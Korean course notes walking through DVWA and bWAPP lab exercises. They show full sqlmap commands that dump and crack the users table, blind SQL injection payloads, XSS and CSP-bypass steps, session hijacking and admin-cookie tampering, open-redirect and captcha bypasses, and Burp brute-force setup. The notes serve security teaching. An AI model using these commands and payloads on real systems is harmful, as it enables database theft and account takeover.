⚠️ SQL 인젝션은 현재까지도 TOP 10 취약점 안에 지속적으로 포함되는 높은 위험도의 취약점이다. DB 안에 계정 정보 외에도 아주 중요한 데이터들이 들어가 있을 수 있기 때문이다.

## 148. SQL Injection 자동화 및 Blind

### 1. sqlmap 개요

sqlmap은 DB를 공격하기 위해 만들어진 전용 자동화 도구다. 수동 점검에서는 사용자가 일일이 쿼리 문을 입력하지만, sqlmap은 에러 기반·불린 기반·타임 기반·유니온 쿼리 방식 등 다양한 방식으로 자동으로 점검한다. DB 보안이 제대로 구축되어 있지 않은 경우, sqlmap 만으로도 내부 데이터 정보를 충분히 확인할 수 있다.

### 2. 사전 준비 — 쿠키 정보 확인

sqlmap으로 인증이 필요한 페이지를 점검하려면 현재 로그인된 세션의 쿠키 정보가 필요하다.

### 1. F12(개발자 도구) 실행

### 2. Application(또는 Storage) → Cookies 확인


| 쿠키 이름 | 내용 |
|---|---|
| PHPSESSID | PHP 세션 아이디 값 |
| security | 현재 보안 레벨 (예: medium) |

### 3. sqlmap 기본 명령어 구조

Medium 레벨에서 sqlmap을 활용하는 예시다.

# 쿠키 값 지정 옵션: --cookie # URL 지정 옵션: -u # 전송 데이터 지정: --data # 점검할 파라미터 지정: -p sudo sqlmap \ --cookie "PHPSESSID=세션값; security=medium" \ -u "<http://대상IP/vulnerabilities/sqli/>" \ --data "id=1&Submit=Submit" \ -p id 실행 중 yes/no 질문이 나오면 엔터로 진행한다.

URL에 파라미터가 포함된 경우 큰따옴표로 URL 전체를 감싸서 지정한다.

# URL에 파라미터가 포함된 경우 예시 sudo sqlmap \ --cookie "PHPSESSID=세션값; security=medium" \ -u "<http://대상IP/vulnerabilities/sqli/?id=1&Submit=Subm it>" \ -p id

### 4. 취약점 점검 결과 확인

점검 완료 후 화면 하단의 결과를 확인한다.


| 확인 항목 | 결과 예시 |
|---|---|
| 백엔드 DBMS | MySQL 5.1 이상 |
| 취약 파라미터 | id |
| 확인된 취약 방식 | boolean-based blind, error-based, time-based blind, UNION query |

결과에서 유니온 쿼리를 이용했을 때 두 개의 칼럼이 있다는 것이 확인된다.

### 5. DB 정보 추출

#### 5-1. 데이터베이스 목록 확인

# --dbs 옵션으로 DB 목록 조회 sudo sqlmap \ --cookie "PHPSESSID=세션값; security=medium" \ -u "<http://대상IP/vulnerabilities/sqli/>" \ --data "id=1&Submit=Submit" \ -p id \ --dbs 결과 예시: dvwa , information_schema , mysql , test test  DB가 존재하는 경우 MySQL 보안 설치(mysql_secure_installation)에서 삭제 작업이 완료되지 않은 것이다.

#### 5-2. 테이블 목록 확인

# -D [DB명] --tables 옵션으로 테이블 목록 조회 sudo sqlmap \ --cookie "PHPSESSID=세션값; security=medium" \ -u "<http://대상IP/vulnerabilities/sqli/>" \ --data "id=1&Submit=Submit" \ -p id \ -D dvwa \ --tables 결과: guestbook , users

#### 5-3. 칼럼 목록 확인

# -D [DB명] -T [테이블명] --columns 옵션 sudo sqlmap \ --cookie "PHPSESSID=세션값; security=medium" \ -u "<http://대상IP/vulnerabilities/sqli/>" \ --data "id=1&Submit=Submit" \ -p id \ -D dvwa \ -T users \ --columns

#### 5-4. 데이터 덤프 (계정 정보 추출)

# --dump 옵션으로 테이블 내용 전체 조회 sudo sqlmap \ --cookie "PHPSESSID=세션값; security=medium" \ -u "<http://대상IP/vulnerabilities/sqli/>" \ --data "id=1&Submit=Submit" \ -p id \ -D dvwa \ -T users \ --dump sqlmap이 해시된 패스워드를 자동으로 크래킹하여 원래 패스워드와 함께 출력한다. 별도로 패스워드를 크래킹하는 과정 없이 결과가 바로 나온다.

### 6. SQL Injection Blind

#### 6-1. Blind 인젝션의 특징

일반 SQL 인젝션과 달리 Blind 인젝션은 어떤 값을 입력하더라도 정보가 아무것도 출력되지 않는다. 오직 "존재한다(Exists)" 또는 "존재하지 않는다(Missing)" 두 가지 반응만 보여준다.

작은 따옴표 삽입 시: "Missing" 출력 정상적인 아이디 값(예: 5) 입력 시: "User ID exists in the database." 출력

#### 6-2. 수동 점검의 한계

Blind 인젝션에서 정보를 수동으로 추출하려면 DB 이름의 각 자리 문자를 한 글자씩 추측해 야 한다. 예를 들어 DB 이름이 dvwa 인지 알아내려면 아래와 같은 과정이 필요하다.


| 단계 | 쿼리 예시 | 반응 |
|---|---|---|
| 첫 번째 글자가 'a'인가? | SUBSTR(table schema,1,1)='a'<br>_ | Missing |
| 첫 번째 글자가 'b'인가? | SUBSTR(table schema,1,1)='b'<br>_ | Missing |
| 첫 번째 글자가 'd'인가? | SUBSTR(table schema,1,1)='d'<br>_ | Exists |
| 두 번째 글자가 'v'인가? | SUBSTR(table schema,2,1)='v'<br>_ | Exists |

DB 이름 하나를 알아내기 위해서도 매우 많은 쿼리 문을 사용해야 한다. 이러한 이유로 Blind 인젝션의 수동 점검은 직접 사용하기 어렵고, 파이썬 등의 프로그래밍 언어로 자동화 코드를 작성하거나 sqlmap을 활용하는 것이 일반적이다.

수동 점검 시 삽입하는 구문 예시 (채팅창 제공 예시):

-- information_schema.columns에서 DISTINCT로 중복 제거하여 조회 -- SUBSTR 함수로 첫 번째 자리 문자가 'a'인지 확인 1' AND SUBSTR(SELECT DISTINCT(table_schema) FROM informatio n_schema.columns,1,1)='a' # DISTINCT : 조회 결과에서 중복 값을 제거 SUBSTR : 문자열에서 특정 위치의 문자를 추출 ⚠️ 이러한 방식으로 DB 이름, 테이블 이름, 칼럼 이름을 모두 한 글자씩 찾아야 한다. 경우의 수가 매우 많아 수동으로는 사실상 힘들다.

#### 6-3. sqlmap으로 Blind 점검

SQL Injection Blind 페이지에서도 sqlmap을 동일하게 활용할 수 있다.

# sqli_blind 경로로 변경하여 점검 sudo sqlmap \ --cookie "PHPSESSID=세션값; security=low" \ -u "<http://대상IP/vulnerabilities/sqli_blind/>" \ --data "id=1&Submit=Submit" \ -p id 점검 결과 예시: boolean-based blind , time-based blind  방식으로 취약점 확인.

# 취약점 확인 후 DB 목록 조회 동일하게 진행 sudo sqlmap \ --cookie "PHPSESSID=세션값; security=low" \ -u "<http://대상IP/vulnerabilities/sqli_blind/>" \ --data "id=1&Submit=Submit" \ -p id \ --dbs 이후 테이블 목록, 칼럼 목록, 덤프 작업은 앞서 설명한 일반 SQL Injection과 동일한 방식으로 진행한다.

### 7. 수동 점검과 자동화 도구 비교

수동 점검은 사용자 또는 해커가 일일이 쿼리 문을 직접 입력하는 방식이고, sqlmap은 자동 화된 방식으로 다양한 점검 방법을 모두 실행한다. 속도와 효율 면에서 자동화 도구가 월등 하며, Blind 인젝션처럼 수동으로 하기 힘든 환경에서도 동일한 결과를 얻을 수 있다.

## 149. 세션 취약점과 스크립트 공격 분석

### 1. Weak Session IDs (취약한 세션 아이디)

#### 1-1. 개요

세션 아이디가 누구나 예측 가능한 방식으로 생성되면 공격자가 다음 쿠키 값을 유추하여 세션을 탈취할 수 있다. 레벨별로 세션 아이디 생성 방식을 확인하고 취약점 여부를 분석한다.

Generate 버튼을 클릭할 때마다 쿠키에 새로운 세션 값이 설정된다. F12 개발자 도구의 Application(Storage) > Cookies에서 dvwaSession  쿠키 값 변화를 확인한다.

#### 1-2. Low 레벨

Generate 버튼을 클릭할 때마다 dvwaSession  쿠키 값이 1, 2, 3으로 순차적으로 증가한다. 누구나 다음 값이 무엇인지 알 수 있으므로 매우 취약하다.

#### 1-3. Medium 레벨

Generate를 클릭하면 쿠키 값이 숫자로 구성되어 나온다. 다시 Generate를 누르면 일부 자리만 바뀌는 것을 확인할 수 있다. 예를 들어 178, 228 은 고정되어 있고 그 뒤 4자리 숫자만 변경이 일어난다.

이 값이 어떤 형식인지 알아내기 위해 쿠키 값을 복사하여 구글에 붙여 넣고 검색한다.

검색 결과가 없으면 값 뒤에 **"time"**이라고 추가하여 검색한다.

검색 결과: 세계시간 변환기, 시차계산기, 시간대 변환기 등이 나온다.

이를 통해 이 쿠키 값이 현재 세션의 시간대(타임스탬프)를 값으로 변환한 것임을 알 수 있다. 즉, Generate 버튼을 누를 때의 시간 값이 그대로 코드화되어 쿠키에 들어간다.

코드를 확인하면 time()  함수를 사용하여 세션 값을 생성하고 있다.

// time() 함수: 현재 시간을 Unix 타임스탬프로 반환 time()

Generate 버튼을 누르는 순간의 시간을 기록하고 시간 변환기에 입력하면 동일한 값이 나온다. 즉, 버튼을 누른 시각으로 쿠키 값의 역추적이 가능하다.

#### 1-4. High 레벨

두 개의 쿠키가 생성된다. 위쪽 쿠키는 고정되어 있고, dvwaSession  값은 Generate를 클릭할 때마다 변경된다. Low·Medium 레벨보다 예측이 어렵지만, 여러 번의 값을 수집하여 변화 규칙을 분석하면 패턴 파악이 가능하다. 코드에서 해시값을 적용하여 생성하는 것을 확인할 수 있다.

#### 1-5. Impossible 레벨

Generate를 여러 번 클릭해도 쿠키 값에 변화가 보이지 않는다. 겉으로는 값이 바뀌지 않는 것처럼 보이지만, 코드를 확인하면 아래와 같이 구현되어 있다.

// 20바이트의 랜덤한 바이트 생성 후 hex로 변환 bin2hex(random_bytes(20))


| 함수 | 설명 |
|---|---|
| random bytes(20)<br>_ | 20바이트의 랜덤 바이트 생성 |
| bin2hex() | 바이너리(이진) 파일을 hex(16진수) 파일로 변환 |
| hex2bin() | hex 파일을 bin 파일로 변경 (반대 방향) |

화면에 보여지는 값이 아니라 bin2hex 로 변환된 값이 실제 세션 아이디가 된다. 공격자가 화 면을 보고 바뀌는 게 없다고 판단하더라도, 실제 내부적으로는 매번 새로운 랜덤 값이 생성되어 예측이 불가능하다.

### 2. DOM XSS (DOM 기반 XSS)

#### 2-1. DOM 개념

DOM(Document Object Model)은 웹브라우저가 HTML이나 XML 문서를 인식하고 처리하는 방식을 정의하는 객체 모델이다. DOM을 사용하면 자바스크립트 같은 스크립트가 삽입되었을 때 동적으로 페이지를 수정하거나 삭제하거나 생성하는 것이 가능해진다.

#### 2-2. Low 레벨 동작 확인

언어 목록에서 항목을 선택하면 URL의 default  파라미터에 선택한 언어가 전달된다.

<http://대상IP/vulnerabilities/xss_d/?default=English> 목록에 없는 값을 직접 입력하면(예: Korean ) URL의 default  파라미터에 그 값이 들어가며 동적으로 처리된다.

#### 2-3. 스크립트 삽입

default  파라미터에 스크립트 태그를 삽입하면 실행된다.

<script>alert(1)</script> 스크립트가 실행되어 알림창이 뜨고, 현재 선택된 언어 표시 부분에 아무것도 나타나지 않는다. 일반 문자열이 아닌 스크립트로 인식되어 실행된 것이다.

#### 2-4. DOM XSS의 특징

결과적으로 Reflected XSS, Stored XSS와 동일한 XSS 취약점이다. 차이점은 현재 페이지가 DOM 기반이라는 것이다. DOM 기반 페이지에서는 HTML들이 동적으로 인식되어 처 리되기 때문에, 스크립트를 막기 위한 코드 외에 정적으로 처리되어야 할 부분은 정적으로 처리될 수 있도록 개발자가 추가적인 코딩을 제공해야 한다.

Medium·High·Impossible 레벨도 Reflected XSS, Stored XSS와 동일한 방식으로 진행하면 된다.

### 3. CSP Bypass (Content Security Policy 우회)

#### 3-1. CSP 개념

CSP(Content Security Policy)는 콘텐츠 보안 정책이다. 웹페이지 안에 있는 다양한 콘텐 츠에 대해 보안 정책을 추가하여 보안성을 높인다. 예를 들어 허용된 도메인의 스크립트만 로드되도록 화이트리스트를 설정할 수 있다.

#### 3-2. Low 레벨 동작 확인

이 페이지는 외부 소스(URL)를 입력하면 해당 스크립트를 실행하는 기능을 제공한다. 개발자가 화이트리스트를 만들어 허용된 URL들을 지정해두고, 해당 URL에서만 스크립트를 로드할 수 있도록 설정한 구조다.

코드를 확인하면 허용된 도메인 주소 목록이 변수에 들어가 있으며, 입력된 주소가 그대로 스크립트 src  속성에 삽입되어 실행되는 구조다.

<!-- src에 입력된 URL이 삽입되어 실행 --><script src="[입력된 URL]"></script>

#### 3-3. 우회 방법

Pastebin.com처럼 허용된 도메인에 스크립트 코드를 올린 후, 해당 URL을 입력란에 넣고 Include(인클로드)를 클릭하면 CSP 정책을 우회하여 스크립트가 실행될 수 있다.

Mozilla 등의 CSP 관련 문서를 확인하면 CSP를 우회하는 다양한 방법들이 정리되어 있다.


| 방법 | 설명 |
|---|---|
| script 태그 활용 | <script src="..."> 방식으로 스크립트 삽입 |
| img 태그 활용 | <img onerror="..."> 방식으로 스크립트 실행 |
| iframe 태그 활용 | <iframe src="..."> 방식으로 삽입 |
| eval 함수 활용 | eval() 함수를 이용한 코드 실행 |

CSP 우회를 막으려면 허용된 도메인 외의 입력을 차단하고, 입력란에서 스크립트 태그 직접 작성도 막아야 한다.

### 4. JavaScript 공격

#### 4-1. Low 레벨 동작 확인

입력란에 **"success"**를 입력하고 Submit하면 "win" 메시지가 출력된다. 그러나 다른 문자열을 입력하면 Change.me 가 그대로 출력된다.

실제로 Submit 시 사용자 토큰(user_token)도 함께 전송되어야 한다. 토큰 없이 "success"만 입력하고 Submit하면 "Invalid token" 메시지가 출력된다.

#### 4-2. 토큰 확인 방법

F12 개발자 도구의 Network(네트워크) 탭을 열고, 페이지를 리로드한 후 Submit 버튼을 클릭한다.

목록에서 javascript  디렉토리 관련 항목을 선택하면 요청(Request) 정보를 확인할 수 있다. 요청 방식이 POST 방식으로 전송되고 있으며, 요청 정보에 user_token  값이 포함되어 있는 것을 확인한다.

#### 4-3. 우회 방법 1 — 프락시 툴 활용

ZAP 또는 Burp Suite로 Submit 시점의 트래픽을 인터셉트한다. "success"를 입력하고 Submit할 때의 패킷을 잡은 후, user_token  파라미터 자리에 복사해둔 토큰 값을 추가하여 포워드한다.

#### 4-4. 우회 방법 2 — 개발자 도구 Console 활용

### 1. F12 개발자 도구에서 인스펙트(요소 선택) 기능으로 입력 폼을 클릭한다.

### 2. HTML 코드에서 폼의 id  속성 값을 확인한다. (예: id="phrase" )

### 3. Console 탭에서 아래 명령을 입력하고 실행한다.

// 폼의 id 값이 "phrase"인 경우, 세미콜론으로 마무리 document.getElementById("phrase").value = "success";

이 방법은 현재 페이지에 이미 존재하는 사용자 토큰을 그대로 활용하므로, 토큰이 맞지 않는다는 오류 없이 "success"가 입력된 상태로 폼이 제출된다. 결과적으로 Change.me 가 아닌 "success" 상태로 우회에 성공한다.

콘솔에서 폼에 직접 값을 넣는 방법은 현재 페이지의 유저 토큰을 그대로 사용하기 때문에 토큰 검증을 우회할 수 있다.

## 150. 인가 우회, 리디렉트 취약점, 암호학, API 취약점 분석

API 취약점 분석

### 1. Authorization Bypass (인가 우회)

#### 1-1. 인증과 인가의 구분


| 용어 | 설명 |
|---|---|
| 인증(Authentication) | 아이디와 패스워드를 입력하여 본인임을 확인하<br>는 과정 |
| 인가(Authorization) | 해당 페이지나 기능에 접근할 권한이 있는지 확인<br>하는 과정 |

Authorization Bypass 취약점은 서버 측에서 접근 권한(인가) 검증이 누락되거나 불완전 할 때 발생한다.

#### 1-2. 공통 설정 확인

실습 환경에서 관리자(admin) 계정으로 로그인하면 Authorization Bypass 메뉴가 보인다. 이 페이지에서 사용자의 이름(First Name, Surname)을 수정할 수 있으며, 관리자 유저 만 접근 가능하다고 명시되어 있다.

일반 사용자 계정( gordonb , abc123 )으로 로그인하면 메뉴 자체가 보이지 않는다.

메뉴에서 보이지 않는 것과 실제 접근이 차단되는 것은 별개의 문제다.

#### 1-3. Low 레벨

관리자로 접속하여 Authorization Bypass 메뉴를 클릭했을 때의 URL 경로를 확인한다. (예: /vulnerabilities/authbypass/ )

일반 사용자 계정( gordonb , abc123 )으로 로그인한 상태에서 해당 경로를 URL에 직접 입력하면 접근이 가능하다. 개발자가 메뉴만 숨겼을 뿐 서버 측 접근 권한 설정이 빠진 것이다.

코드를 확인하면 실제 페이지 처리 파일( dvwa_page.inc.php )에 권한 확인 로직이 없다.

#### 1-4. Medium 레벨

일반 사용자 계정으로 해당 URL에 직접 접근하면 "Unauthorised" 메시지와 함께 403 코드가 반환된다.

코드에서 현재 사용자가 어드민인지 확인하는 로직이 있다. 우회 방법은 세션 아이디를 어드민의 것으로 변조하는 것이다.

우회 절차:

### 1. 어드민으로 로그인하여 F12 > Application > Cookies에서 PHPSESSID  값을 복사

### 2. 일반 사용자( gordonb , abc123 )로 로그인

### 3. ZAP 또는 Burp Suite의 인터셉트 기능을 사용하여 Authorization Bypass 경로 접근

요청을 가로챔

### 4. 요청의 PHPSESSID  값을 어드민의 세션 값으로 변조 ( security  쿠키는 동일하게 유지)

### 5. 포워드

서버는 세션 아이디를 보고 어드민으로 판단하여 페이지를 뿌려준다. 즉, 현재 사용자가 어 드민인지 확인하는 것은 어드민으로 로그인했을 때의 세션 아이디 값을 기준으로 하는 것이 기 때문에, 세션 값을 변조하면 우회가 가능하다.

#### 1-5. High 레벨

관리자 여부 확인에 토큰 정보도 추가로 검증한다.

어드민 토큰 정보는 F12 > Network 탭에서 페이지 갱신 또는 값을 변경하고 업데이트를 실행할 때 요청 정보에서 확인할 수 있다. 해당 토큰 값을 복사하여 프락시 툴에서 세션 아이디와 함께 변조 후 포워드하면 우회가 가능하다.

#### 1-6. Impossible 레벨

코드에 주석이 달려 있으며, PHP 파일 외의 다른 곳에서도 접근 권한 설정이 이루어져 있음을 확인할 수 있다. 단순한 세션·토큰 변조만으로는 우회가 되지 않는다. 다른 취약점을 함께 활용해야 추가적인 우회 가능성을 검토할 수 있다.

### 2. Open HTTP Redirect

#### 2-1. 리디렉트 개념

리디렉트(Redirect)는 현재 페이지에서 다른 페이지로 자동 연결하는 것이다. 리디렉트 파라미터에 대한 검증이 없으면 공격자가 원하는 피싱 사이트로 사용자를 연결할 수 있다.

⚠️ 인터넷 서핑 중 어떤 사이트에 접속했는데 다른 사이트로 이동될 때는 도메인을 유심 히 확인해야 한다. 예를 들어 google.com 인 줄 알았는데 실제로는 g0ogle.com 일 수 있다.

피싱 사이트는 실제 사이트와 거의 유사하게 제작 가능하므로 도메인과 내용을 주의 깊게 확인해야 한다.

#### 2-2. Low 레벨 — 동작 확인

페이지에 있는 두 개의 링크를 클릭하면 각각 info.php?id=1 , info.php?id=2 로 이동한다. 이때 URL 경로 뒤에 redirect 라는 파라미터를 주면 연결될 사이트를 지정할 수 있다.

코드를 확인하면 redirect  파라미터가 존재하는지 확인하고, 해당 값을 가져와 Location 으로 이동시키는 로직이 있다.

#### 2-3. Low 레벨 — 파라미터 위치 탐색

redirect  파라미터를 어느 위치에 붙여야 하는지 테스트한다.

# 방법 1: 페이지 경로 뒤에 직접 붙이기 (redirect 파라미터 임의 추가)

<http://대상IP/vulnerabilities/redirects/?redirect=http://연결할사이트> # 방법 2: info.php 뒤에 redirect 파라미터 추가 <http://대상IP/vulnerabilities/redirects/info.php?redirect=http://연결할사이트> 방법 2로 입력했을 때 Quart ID missing 처럼 다른 오류가 뜬다면 id  파라미터가 없어서 발생하는 것이며, redirect 파라미터 자체는 인식되고 있는 것이다.

파라미터가 올바른 위치에 있는 것이 확인되면, redirect  값으로 원하는 사이트를 입력했을 때 해당 사이트로 리디렉트가 일어나야 한다.

#### 2-4. Low 레벨 — 칼리 웹서버로 리디렉트 테스트

칼리 터미널에서 파이썬으로 간단한 웹서버를 실행한다.

# 파이썬으로 8000번 포트에 웹서버 실행 python3 -m http.server 8000 redirect  파라미터에 칼리 IP와 포트를 입력하여 리디렉트가 되는지 테스트한다.

<http://대상IP/vulnerabilities/redirects/?redirect=http://칼리IP:8000> 테스트 결과, 구글 닷컴이나 칼리 웹서버로의 접속이 안 되는 경우도 있다. view 소스로 코드를 확인하면 redirect  파라미터가 올바르게 인식되고 있는지 점검할 수 있다.

redirect  파라미터에 대한 검증이 없기 때문에, 공격자가 원하는 파라미터를 통해 원하는 사이트로 연결할 수 있다는 것이 핵심이다. 실제 환경에서는 피싱 사이트를 여기에 연결 하면 된다.

#### 2-5. Medium 레벨

코드에서 http:// , https://  등 특정 문자열을 포함하는지 검증하는 로직이 추가된다. 해당 문자열이 포함되어 있으면 차단한다.

대소문자를 변경( HTTP:// , Https://  등)하거나 대소문자를 섞는 방식으로 우회가 가능하다.

#### 2-6. High 레벨

코드에서 info.php 에서만 파라미터가 입력될 수 있도록 제한하는 조건이 추가된다.

info.php 에서의 요청이 아니라면 실행되지 않는다.

프락시 툴로 요청을 가로채어 파라미터 값을 변조하거나 redirect  파라미터를 추가하여 포워드하면 우회가 가능하다.

### 3. Cryptography (암호학)

#### 3-1. 개요

이 항목은 코드화된 값이 어떤 암호화 방식인지 확인하고, 실제 값을 복원(디코드)하는 것이 주요 내용이다. 사이버셰프(CyberChef), decode.fr, MD5 온라인 등의 사이트를 활용한다.

#### 3-2. Low 레벨

입력란에 값(예: happy )을 입력하고 Submit하면 인코드된 값이 출력된다. 해당 값을 복사하여 메시지 입력란에 붙여넣고 Decode 후 Submit하면 원래 값이 나온다.

약 32자리의 16진수로 이루어진 값은 대부분 MD5 방식이다.

# 터미널에서 해시 방식 확인 sudo hash-identifier # 해시 값 입력 확인 방법:


| 도구/사이트 | 용도 |
|---|---|
| hash-identifier | 터미널에서 해시 방식 판별 |
| 사이버셰프(CyberChef) | 다양한 인코딩/디코딩 |


| 도구/사이트 | 용도 |
|---|---|
| decode.fr | 해시 디코드 |
| MD5 온라인 | MD5 방식 디코드 |

#### 3-3. Medium 레벨

Medium 레벨에서는 출력된 세션 관련 내용 중에 AES 128 방식이 사용되고 있다고 명시된 다. 또한 토큰에 관련된 정보를 넣어서 관리자 권한 내에 되어 있는 내용을 확인하도록 안내가 나온다.

코드화된 내용들을 분석하려면 사이버셰프나 decode.fr 등의 사이트에서 해당 방식으로 디 코드를 시도해야 한다.

Medium 레벨 이상에서는 **솔트(Salt)**가 추가된다.


| 레벨 | 암호화 방식 | 솔트 |
|---|---|---|
| Low | MD5 | 없음 |
| Medium | AES 128 | 있음 |

솔트는 동일한 패스워드라도 역추적이 용이하지 않도록 만들어주는 추가 값이다. 레벨이 올라갈수록 복잡한 알고리즘과 솔트가 함께 적용되므로 역추적이 더 어려워진다.

레벨이 올라갈수록 알고리즘을 알고 있더라도 솔트에 대한 정보까지 확인해야 하므로 복 원이 더 어렵다.

### 4. API

#### 4-1. API 개념

API(Application Programming Interface)는 기존의 다른 프로그램이나 플랫폼과 연결하기 위한 인터페이스다. 현재 AI 분야에서도 다양한 API를 사용하여 다른 생성형 AI나 다른 도구·프로그램들과 연결한다.

#### 4-2. 취약점 개요

API의 버전이 낮은 경우 취약점이 존재할 수 있다. 최신 API를 사용하는 것이 권장된다.

현재 DVWA의 API 항목은 GitHub API와 연결되어 README.md  파일을 로드하는 구조다.

페이지에서 리드미 링크를 클릭하면 GitHub 관련 사이트로 넘어간다.

현재 버전 2 API로 연결되어 있다.

#### 4-3. 점검 방법

F12 개발자 도구의 Network 탭에서 현재 페이지의 요청 정보를 확인하면 API 관련 요청 헤 더나 버전 정보를 확인할 수 있다.

프락시 툴(ZAP/Burp Suite)로 리드미 파일 클릭 시점의 요청을 인터셉트하면 API 버전 정보를 확인할 수 있다.

API 버전을 버전 1로 변조하여 전송하면 버전에 따라 응답 내용이나 접근 가능한 정보가 달라질 수 있으며, 낮은 버전 API의 취약점을 통한 정보 탈취 가능성을 확인할 수 있다.

### 2. Captcha Bypassing

#### 2-1. 취약점 개요

캡차(Captcha)는 2차 인증 수단으로 사용된다. 캡차 값을 버프 스위트로 고정한 상태에서 1차 인증(아이디/패스워드)을 다른 계정으로 변조하면 캡차 우회가 가능하다.

#### 2-2. 실습 방법

### 1. b  버그 계정으로 로그인 시도

### 2. 캡차 값을 정확하게 입력한 후 버프 스위트 인터셉트 ON

### 3. 인터셉트된 패킷에서 아이디와 패스워드를 다른 계정 정보로 변조

### 4. 캡차 값은 변경하지 않고 Forward

# 버프 인터셉트 후 파라미터 변조 예시 login=b&password=bug&captcha=[정확한캡차값]

↓ 변조 login=테스트계정&password=1234&captcha=[동일한캡차값]

원래 캡차는 사용자가 로봇인지 사람인지 구분하기 위한 수단인데, 1차 아이디/패스워드 인증 이후에 캡차 인증이 들어가는 구조에서 캡차를 고정하고 1차 인증 정보를 변조하면 다른 계정으로 접속이 가능하다.

### 3. Forgotten Function (비밀번호 찾기 취약점)

#### 3-1. 취약점 개요

비밀번호 찾기 기능에서 이메일 주소를 입력하면 비밀번호 힌트(시크릿 메시지)를 화면에 출력하는 취약점이다.

관리자 이메일은 웹페이지 하단에 노출되는 경우가 많음 노출된 이메일로 비밀번호 찾기를 시도하면 힌트가 노출됨

#### 3-2. 실습 방법

# 이메일 입력 후 Forgot 버튼 클릭 test@test.com → 입력 → Forgot 클릭 시크릿 메시지(비밀번호 힌트)가 화면에 출력됨을 확인

### 4. Insecure Login Form (취약한 로그인 폼)

#### 4-1. 취약점 개요

로그인 폼 내 HTML 소스에 계정 정보가 평문으로 포함되어 있으나, 텍스트 색상이 배경색 과 동일하게 설정되어 보이지 않는 경우이다.

#### 4-2. 확인 방법


| 방법 | 설명 |
|---|---|
| 마우스 드래그로 블록 선택 | 숨겨진 텍스트 확인 가능 |
| 페이지 소스 보기 | 소스 내 평문 계정 정보 확인 |

페이지 소스에서 form  태그를 검색하면 흰색(white)으로 설정된 아이디/패스워드 확인 가능 개발자가 잊어버리지 않기 위해 소스 내에 계정 정보를 남겨두는 경우가 있으나, 이는 보안성이 결여된 방법이다.

### 5. Logout Management (로그아웃 세션 미종료)

#### 5-1. 취약점 개요

로그아웃을 해도 세션이 완전히 종료되지 않아 브라우저 뒤로 가기 시 로그인된 페이지로 돌 아오는 취약점이다.

#### 5-2. 확인 방법

### 1. 로그인 상태에서 Logout  클릭 → 로그인 창으로 이동

### 2. 브라우저에서 뒤로 가기 클릭

### 3. 로그인된 페이지(Welcome b)가 그대로 출력됨 → 세션이 아직 살아있음

로그아웃 후 다른 사람이 뒤로 가기를 누르면 로그인된 상태로 개인정보가 노출될 수 있다. 아직도 세션 종료 처리가 미비한 사이트들이 존재한다.

#### 6-2. 두 개 이상 파라미터 대입 (Cluster Bomb)

아이디와 패스워드 모두 모르는 경우 Cluster Bomb 방식을 사용한다.

# Intruder 어태크 타입: Cluster Bomb 선택 # 페이로드 포지션: 아이디(§b§), 패스워드(§bug§) 두 곳 설정 # Payload 1: user.txt 파일 로드 # Payload 2: pass.txt 파일 로드 사전 파일 생성 예시 # 칼리에서 user.txt 파일 생성/수정 vi user.txt # 내용 추가: b, bee, test 등 # pass.txt 파일 생성/수정 vi pass.txt # 내용 추가: 1234, bug, test 등 패스워드가 소문자 영어 세 글자로만 이루어져 있다면 A에서 Z까지의 경우의 수가 크지 않아 수동으로도 대입 가능하다. 현재는 최소 10글자 이상, 영어 대문자·소문자·특수문자· 숫자를 조합하여 패스워드를 만들도록 권장한다.

### 7. Administrative Portal (관리자 포털 세션 취약점)

#### 7-1. Low 레벨 — URL 파라미터 조작

관리자 포털 페이지의 URL에 admin  파라미터가 포함되어 있다.

# Low 레벨 URL 예시 http://[beeboxIP]/bwapp/ba_insecure_login.php?admin=0 # admin 파라미터를 1로 변경 http://[beeboxIP]/bwapp/ba_insecure_login.php?admin=1 admin=0 : 잠김 상태 admin=1 : 잠금 해제 (관리자 포털 접근 가능)

그 외 값: 다시 잠김 상태

#### 7-2. Medium 레벨 — 쿠키 값 조작

Medium 레벨에서는 URL 파라미터가 아닌 쿠키 값으로 관리자 권한을 확인한다.

개발자 도구로 쿠키 확인 방법 F12 → Storage(저장소) → Cookies admin  쿠키 값이 0 으로 설정되어 있음 콘솔에서 쿠키 값을 1 로 변경 후 새로 고침하면 잠금 해제 // 콘솔에서 쿠키 값 변경 document.cookie = "admin=1";

### 8. Session Management — Cookies

#### 8-1. 쿠키(Cookie) 기본 개념


| 쿠키 종류 | 방향 | 설명 |
|---|---|---|
| Cookie (요청 헤더) | 클라이언트 → 서버 | 클라이언트가 서버에 요청 시 전송 |
| Set-Cookie (응답 헤더) | 서버 → 클라이언트 | 서버가 클라이언트에게 제공하는 쿠키 값 |

#### 8-2. HTTP-Only 옵션

HTTP-Only 옵션이 설정된 쿠키는 자바스크립트를 통해 쿠키에 접근하지 못하도록 차단한다.

// document.cookie로 쿠키 값 확인 (HTTP-Only 미설정 시) document.cookie HTTP-Only 옵션이 설정되지 않으면 document.cookie  명령으로 쿠키 정보 노출 쿠키에 날짜·시간 정보 등 민감한 정보가 포함된 경우 추가 문제 발생 가능

#### 8-3. 쿠키 값 확인 방법


| 방법 | 설명 |
|---|---|
| 개발자 도구 → Storage | 쿠키 목록 및 값 확인 |
| 버프 스위트 인터셉트 | 요청/응답 헤더의 쿠키 확인 |
| 브라우저 콘솔 | document.cookie 명령으로 출력 |

### 9. Session ID in URL (URL 세션 ID 노출)

#### 9-1. 취약점 개요

URL에 세션 아이디(PHPSESSID)가 포함되어 노출되는 취약점이다.

# 취약한 URL 예시 http://[beeboxIP]/bwapp/sm_session_url.php?PHPSESSID=0EC...603 URL에 포함된 세션 ID 값이 실제 쿠키의 세션 ID 값과 동일 세션 ID가 노출되면 공격자가 해당 세션을 탈취하여 해당 사용자로 접속 가능

#### 9-2. 세션 탈취 테스트

# 버프 스위트를 이용한 세션 탈취 테스트

### 1. 테스트 계정으로 로그인된 상태에서 버프 인터셉트 ON

### 2. 페이지 새로 고침하여 요청 패킷 인터셉트

### 3. 쿠키 헤더의 PHPSESSID 값을 b 계정의 세션 ID로 변조

### 4. Forward → b 계정의 세션으로 접속됨을 확인

이렇게 세션 아이디를 탈취하여 다른 사용자로 접속하는 것을 세션 탈취라고 한다. 중요한 세션 아이디나 쿠키 값은 인코딩 처리를 하거나 일반적인 방법으로는 보이지 않게 해야 한다.

### 10. Strong Sessions (세션 강도 확인)

#### 10-1. 취약점 개요

정상적인 경로(here 클릭 → 페이지 이동)로 접속할 때와 URL을 직접 복사하여 다른 브라우저에서 접속할 때의 반응 차이를 확인한다.

